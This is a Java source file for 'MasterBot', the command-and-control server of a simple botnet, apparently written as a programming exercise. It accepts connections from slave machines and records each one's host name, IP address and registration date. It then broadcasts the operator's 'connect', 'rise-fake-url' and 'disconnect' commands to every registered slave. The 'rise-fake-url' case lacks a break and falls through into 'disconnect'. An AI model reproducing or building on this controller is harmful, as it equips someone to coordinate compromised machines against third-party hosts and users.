

import java.io.*;
import java.net.*;
import java.util.ArrayList;
import java.sql.Date;

public class MasterBot
{
	ServerSocket serSock;
	ServerListener sList;
	Thread st;
	ArrayList<Sinfo_client> cList;
	BufferedReader BR;
	PrintWriter pwrite;
	int portNo;	

	public MasterBot(int portNo)
	{
		try 
		{
			this.portNo = portNo;
			this.serSock = new ServerSocket(portNo);
			this.cList = new ArrayList<Sinfo_client>();
			this.sList = new ServerListener();

			this.st  = new Thread(this.sList);
			this.st.start();
		
		} 
		catch (IOException e)
		{
					e.printStackTrace();
		}
	}

	public void runCommand(String str) throws IOException
	{	
				String[] Scmd = str.split(" ");
				
				if(Scmd.length==0)
					return;
				
				switch(Scmd[0])
				{
					case "list":System.out.println("SlaveHostName IPAddress SourcePortNumber RegistrationDate");
						
						for(Sinfo_client C: cList)
						{
							System.out.print(C.getHostname() + " ");
							System.out.print(C.getIpaddress() + " ");
							System.out.print(C.getPort() + " ");
							System.out.print(C.getRegisteredDate() + " ");
							System.out.println();
						}
						break;

					case "connect":
						for(Sinfo_client C : cList)
						{
							pwrite = new PrintWriter(C.getSocket().getOutputStream(), true);
							pwrite.println(str);
						}
						break;
					case "rise-fake-url":

					if(Integer.parseInt(Scmd[1]) == portNo) {
							System.out.println("\nCannot establish connection to a port which is already in use\n");
							
						}
						else {
							for(Sinfo_client C : cList)
							{
								System.out.println("Fake Url created");
								PrintWriter pwrite = new PrintWriter(C.getSocket().getOutputStream(), true);
								pwrite.println(str);						
							}
						}
						
					
					case "disconnect":
						for(Sinfo_client C : cList)
						{
							pwrite = new PrintWriter(C.getSocket().getOutputStream(), true);
							pwrite.println(str);
						}
						break;

					default:
						
						break;
				}
	}
	public static void main(String[] args)
	{	
		int portNo=0;
		
		
		
		if(args[0].equals("-p")&&(args.length==2))
		{
			portNo = Integer.parseInt(args[1]);
		}
		else
		{
			System.out.println("Incorrect format for arguments");
			System.exit(1); 
		}
		
		MasterBot M = new MasterBot(portNo);
		BufferedReader br = new BufferedReader(new InputStreamReader(System.in));
		String a;
				
		
		while(true)
		{	
			a = null;
			try
			{	System.out.print(">");
				a = br.readLine();
				

				if(a.equals("exit"))
					break;
				if(a != null)
				{
					M.runCommand(a);
				}
			} 
			catch (IOException e)
			{
					e.printStackTrace();
			}
		}

	}
	private class ServerListener extends Thread
	{
		public ServerListener() 
		{
		
		}
		@Override
		public void run()
		{
			try
			{
				while(true)
				{
					Socket sc = serSock.accept();
					InetAddress addr = sc.getInetAddress();
					String hostaddr = addr.getHostAddress();
					String name = addr.getHostName();
					Date date = new Date(System.currentTimeMillis());
					int num_p = portNo;
					
					Sinfo_client new_clientInfo = new Sinfo_client(name, hostaddr, num_p, 													sc, date);
					cList.add(new_clientInfo);
				}
			}
			catch (IOException e)
			{
				e.printStackTrace();
			}
		}
	}

	@SuppressWarnings("unused")
	private class Sinfo_client 
	{
		private String name;
		private String hostaddr;
		private int portNo;
		private Socket sock;
		private Date date;

		public Sinfo_client(String name, String hostaddr, int portNo, Socket sock, Date date)
		{
				this.name = name;
				this.hostaddr = hostaddr;
				this.portNo = portNo;
				this.sock = sock;
				this.date = date;
		}


		public String getHostname()
		{
			return name;
		}

		public String getIpaddress()
		{
			return hostaddr;
		}
		
		public Socket getSocket()
		{
			return sock;
		}
		
		public int getPort()
		{
			return portNo;
		}
	

		public void setHostname(String name)
		{
			this.name = name;
		}

		public void setPort(int portNo)
		{
			this.portNo = portNo;
		}
		public Date getRegisteredDate()

		{
			return date;
		}
		
		public void setRegisteredDate(Date date)
		{
			this.date = date;
		}

		public void setIpaddress(String ipaddr)
		{
			this.hostaddr = ipaddr;
		}
				
		public void setSocket(Socket sock)
		{
			this.sock = sock;
		}
		
	}
}


